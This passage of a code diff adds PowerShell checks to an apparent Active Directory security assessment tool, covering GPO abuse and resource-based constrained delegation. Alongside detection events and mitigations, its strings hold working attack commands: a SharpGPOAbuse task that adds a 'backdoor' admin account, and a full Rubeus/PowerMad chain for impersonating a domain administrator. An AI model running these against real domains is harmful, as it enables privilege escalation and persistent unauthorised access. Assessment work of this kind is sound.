+            '# Enumerate all GPO permissions (Blue Team — requires GroupPolicy RSAT)',
+            'Get-GPO -All | ForEach-Object { $gpo = $_; Get-GPPermissions -Guid $gpo.Id -All | Where-Object { $_.Permission -match "GpoEdit|GpoEditDeleteModifySecurity" } | Select-Object @{n="GPO";e={$gpo.DisplayName}}, @{n="Trustee";e={$_.Trustee.Name}}, Permission }',
+            '',
+            '# Identify GPOs linked to Domain root (all-machines scope)',
+            'Get-GPInheritance -Target (Get-ADDomain).DistinguishedName | Select-Object -ExpandProperty GpoLinks | Select-Object DisplayName, GpoId, Enforced',
+            '',
+            '# Identify GPOs linked to Domain Controllers OU',
+            'Get-GPInheritance -Target "OU=Domain Controllers,$(( Get-ADDomain).DistinguishedName)" | Select-Object -ExpandProperty GpoLinks | Select-Object DisplayName, GpoId, Enforced',
+            '',
+            '# Add Immediate Task via GPO abuse (Red Team — requires GpoEdit on target GPO)',
+            '# SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add" --GPOName "Default Domain Policy"',
+            '',
+            '# Force Group Policy refresh on target',
+            '# Invoke-GPUpdate -Computer <targetPC> -RandomDelayInMinutes 0'
+        )
+}
+
+#endregion
+
+#region RBCD (T1134.001)
+
+function Invoke-RedTeamRBCD {
+    <#
+    .SYNOPSIS
+        Red team enumeration for RBCD (Resource-Based Constrained Delegation) privilege escalation (T1134.001).
+    .DESCRIPTION
+        Enumerates:
+          1. Computers with msDS-AllowedToActOnBehalfOfOtherIdentity already configured
+             (possible existing RBCD misconfiguration or prior compromise).
+          2. Non-admin principals with GenericWrite/WriteProperty on computer objects
+             (can set RBCD on those computers to enable S4U2Self impersonation).
+          3. MachineAccountQuota value (needed to create attacker-controlled computer account).
+        In active mode (-SafeMode:$false) performs live AD queries if data is not pre-collected.
+        No modifications are made to the AD environment at any setting.
+    #>
+    [CmdletBinding()]
+    param(
+        [hashtable]$ADData = @{},
+        [bool]$SafeMode    = $true
+    )
+
+    $computers = @(if ($ADData.ContainsKey('Computers')) { $ADData.Computers } else { @() })
+    $acls      = @(if ($ADData.ContainsKey('ACLs'))      { $ADData.ACLs }      else { @() })
+
+    $safePrincipals = @('NT AUTHORITY\\SYSTEM', 'BUILTIN\\Administrators',
+                        'Domain Admins', 'Enterprise Admins',
+                        'Domain Controllers', 'Account Operators', 'S-1-5-18', 'S-1-5-32-544')
+
+    # --- 1. Computers with RBCD already configured -----------------------------------
+    $rbcdComputers = @($computers | Where-Object {
+        $_ -and $_.PSObject.Properties['msDS-AllowedToActOnBehalfOfOtherIdentity'] -and
+        $_.'msDS-AllowedToActOnBehalfOfOtherIdentity'
+    })
+
+    # Active mode: live query if no pre-collected computer data
+    if (-not $SafeMode -and $rbcdComputers.Count -eq 0) {
+        try {
+            $rbcdComputers = @(Get-ADComputer -Filter * -Properties 'msDS-AllowedToActOnBehalfOfOtherIdentity', DNSHostName -ErrorAction Stop |
+                                Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' })
+        }
+        catch { Write-Verbose "RBCD live computer query failed: $_" }
+    }
+
+    $rbcdFindings = @($rbcdComputers | ForEach-Object {
+        $comp = $_
+        $delegatedSD = if ($comp.PSObject.Properties['msDS-AllowedToActOnBehalfOfOtherIdentity']) {
+            try {
+                $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList $comp.'msDS-AllowedToActOnBehalfOfOtherIdentity', 0
+                @($sd.DiscretionaryAcl | ForEach-Object { $_.SecurityIdentifier.ToString() }) -join '; '
+            } catch { 'Binary SDDL (resolve manually)' }
+        } else { 'Unknown' }
+        [PSCustomObject]@{
+            Computer          = $comp.Name
+            DNSHostName       = if ($comp.PSObject.Properties['DNSHostName']) { $comp.DNSHostName } else { $comp.Name }
+            DelegatedSIDs     = $delegatedSD
+            Risk              = 'RBCD configured — verify principal has legitimate need; attacker-controlled SID = full host compromise'
+            ExploitCmd        = "Rubeus.exe s4u /user:<controlledMachine`$> /rc4:<NTHash> /impersonateuser:administrator /msdsspn:cifs/$($comp.Name -replace '[^a-zA-Z0-9\-]','') /ptt"
+        }
+    })
+
+    # --- 2. Computer objects writable by non-admin principals (RBCD setup vector) -----
+    $writableComputerACEs = @($acls | Where-Object {
+        $_ -and $_.AccessControlType -eq 'Allow' -and
+        $_.TargetObject -match 'CN=Computers|OU=' -and
+        $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteProperty' -and
+        $_.IdentityReference -notmatch ($safePrincipals -join '|')
+    } | ForEach-Object {
+        $ace = $_
+        [PSCustomObject]@{
+            Principal    = $ace.IdentityReference.ToString()
+            TargetObject = if ($ace.PSObject.Properties['TargetObject']) { $ace.TargetObject } else { 'Unknown' }
+            Right        = $ace.ActiveDirectoryRights.ToString()
+            AttackChain  = "Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer → S4U2Self + S4U2Proxy → impersonate DA → full host compromise"
+            Prerequisite = 'Also need a controlled machine account (MAQ>0) or existing compromised computer account'
+        }
+    })
+
+    # Active mode: live query computer write ACEs if no ACL data available
+    if (-not $SafeMode -and $acls.Count -eq 0) {
+        try {
+            $domain    = Get-ADDomain -ErrorAction Stop
+            $compOU    = "AD:CN=Computers,$($domain.DistinguishedName)"
+            $liveACEs  = (Get-ACL $compOU -ErrorAction Stop).Access
+            foreach ($ace in $liveACEs) {
+                if ($ace.AccessControlType -eq 'Allow' -and
+                    $ace.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteProperty' -and
+                    $ace.IdentityReference -notmatch ($safePrincipals -join '|')) {
+                    $writableComputerACEs += [PSCustomObject]@{
+                        Principal    = $ace.IdentityReference.ToString()
+                        TargetObject = $compOU
+                        Right        = $ace.ActiveDirectoryRights.ToString()
+                        AttackChain  = 'GenericWrite on computer container → Set RBCD → S4U2Self/Proxy → impersonate DA'
+                        Prerequisite = 'Also need controlled machine account (MAQ>0)'
+                    }
+                }
+            }
+        }
+        catch { Write-Verbose "RBCD live ACL query failed: $_" }
+    }
+
+    # --- 3. MachineAccountQuota (needed to create attacker machine account) -----------
+    $maqValue = 'Not checked (safe mode)'
+    if (-not $SafeMode) {
+        try {
+            $domainObj = Get-ADObject -LDAPFilter '(objectClass=domain)' -Properties 'ms-DS-MachineAccountQuota' -ErrorAction Stop
+            $maqValue  = if ($domainObj.PSObject.Properties['ms-DS-MachineAccountQuota']) {
+                $domainObj.'ms-DS-MachineAccountQuota'
+            } else { 10 }
+        }
+        catch { Write-Verbose "MAQ query failed: $_"; $maqValue = 'Unknown' }
+    }
+
+    $maqFinding = [PSCustomObject]@{
+        Setting          = 'ms-DS-MachineAccountQuota'
+        Value            = $maqValue
+        Risk             = if ($maqValue -is [int] -and $maqValue -ne 0) {
+            "MAQ=$maqValue — any domain user can create $maqValue computer accounts (required for RBCD if no existing controlled computer)"
+        } elseif ($maqValue -is [int] -and $maqValue -eq 0) { 'MAQ=0 — RBCD attack requires pre-existing compromised computer account' }
+        else { 'Not evaluated' }
+    }
+
+    $allFindings = @($rbcdFindings) + @($writableComputerACEs) + @($maqFinding)
+
+    return New-RedTeamResult `
+        -AttackType      'RBCD (Resource-Based Constrained Delegation) Abuse' `
+        -MITRE           'T1134.001' `
+        -SafeMode        $SafeMode `
+        -RiskLevel       'Critical' `
+        -ExploitableCount ($rbcdFindings.Count + $writableComputerACEs.Count) `
+        -Findings        $allFindings `
+        -AttackPath      "1. Find computer where you have GenericWrite/WriteProperty (BloodHound: GenericWrite/WriteDACL edges to computer objects).`n2. Create attacker-controlled computer: New-MachineAccount -MachineAccount attackerPC -Password (ConvertTo-SecureString 'P@ss123' -AsPlainText -Force) [requires MAQ>0 or existing compromised computer].`n3. Set RBCD: Set-ADComputer targetPC -PrincipalsAllowedToDelegateToAccount attackerPC`$`n4. Request TGT: Rubeus.exe asktgt /user:attackerPC`$ /password:P@ss123 /domain:<domain>`n5. S4U impersonation: Rubeus.exe s4u /user:attackerPC`$ /rc4:<NTHash> /impersonateuser:administrator /msdsspn:cifs/targetPC /ptt`n6. Access target: dir \\\\targetPC\\c`$`nMAQ=$maqValue  |  Computers with RBCD: $($rbcdFindings.Count)  |  Writable computer ACEs: $($writableComputerACEs.Count)" `
+        -DetectionEvents @('4741 (computer account created)', '5136 (msDS-AllowedToActOnBehalfOfOtherIdentity modified)', '4769 (S4U service ticket request — look for forwardable flag)', 'MDI: RBCD detection alert', 'Kerberos S4U2Self/S4U2Proxy ticket requests (anomalous impersonation in DC logs)') `
+        -Mitigations     @('Set ms-DS-MachineAccountQuota=0 (prevents domain users creating computer accounts)', 'Restrict GenericWrite/WriteProperty on computer objects to Domain Admins only', 'Audit msDS-AllowedToActOnBehalfOfOtherIdentity on all computer objects regularly', 'Add privileged accounts (DA/EA) to Protected Users group (blocks delegation)', 'Monitor Event 4741 for unexpected computer account creation', 'Deploy Microsoft Defender for Identity (RBCD/S4U abuse detection)') `
+        -Tools           @('Rubeus (s4u /ptt)', 'Impacket/getST.py', 'PowerMad (New-MachineAccount)', 'BloodHound (RBCD edges)', 'PowerView (Get-DomainObjectAcl on computer objects)') `
+        -Commands        @(
+            '# Enumerate computers with RBCD configured (Blue Team)',
+            'Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } | Select-Object Name, DNSHostName',
+            '',
+            '# Check MachineAccountQuota (Blue Team)',
+            'Get-ADObject -LDAPFilter "(objectClass=domain)" -Properties ms-DS-MachineAccountQuota | Select-Object Name, "ms-DS-MachineAccountQuota"',
+            '',
+            '# Set MAQ to 0 to block RBCD new-computer-account vector (Blue Team)',
+            '# Set-ADDomain -Identity (Get-ADDomain) -Replace @{"ms-DS-MachineAccountQuota"=0}',
+            '',
+            '# Create attacker machine account (PowerMad — requires MAQ>0)',
+            '# New-MachineAccount -MachineAccount attackerPC -Password (ConvertTo-SecureString "TempPass123!" -AsPlainText -Force)',
+            '',
+            '# Set RBCD on target (requires GenericWrite/WriteProperty on target computer)',
+            '# Set-ADComputer targetPC -PrincipalsAllowedToDelegateToAccount attackerPC$',
+            '',
+            '# S4U2Self + S4U2Proxy to impersonate Domain Admin (Rubeus — use RC4 hash from asktgt or password directly)',
+            '# Rubeus.exe s4u /user:attackerPC$ /password:TempPass123! /impersonateuser:administrator /msdsspn:"cifs/targetPC.domain.com" /ptt',
+            '',
+            '# Verify impersonation worked',
+            '# dir \\targetPC.domain.com\c$'
+        )
+}
+
+#endregion
+
 #region Wrapper
 
 function Invoke-AllRedTeamChecks {
     <#
     .SYNOPSIS
-        Runs all 22 red team simulation checks and returns array of results.
+        Runs all 27 red team simulation checks and returns array of results.
     .PARAMETER ADData
         Hashtable of collected AD data.
     .PARAMETER SafeMode
@@ -1479,6 +2145,11 @@ function Invoke-AllRedTeamChecks {
         { Invoke-RedTeamDCShadow                -ADData $ADData -SafeMode $SafeMode }
         { Invoke-RedTeamCredentialDumping       -ADData $ADData -SafeMode $SafeMode }
         { Invoke-RedTeamLateralMovement         -ADData $ADData -SafeMode $SafeMode }
+        { Invoke-RedTeamShadowCredentials       -ADData $ADData -SafeMode $SafeMode }
+        { Invoke-RedTeamACLAbuse                -ADData $ADData -SafeMode $SafeMode }
+        { Invoke-RedTeamAdminSDHolder           -ADData $ADData -SafeMode $SafeMode }
+        { Invoke-RedTeamGPOAbuse                -ADData $ADData -SafeMode $SafeMode }
+        { Invoke-RedTeamRBCD                    -ADData $ADData -SafeMode $SafeMode }
     )
 
     $results = [System.Collections.Generic.List[object]]::new()
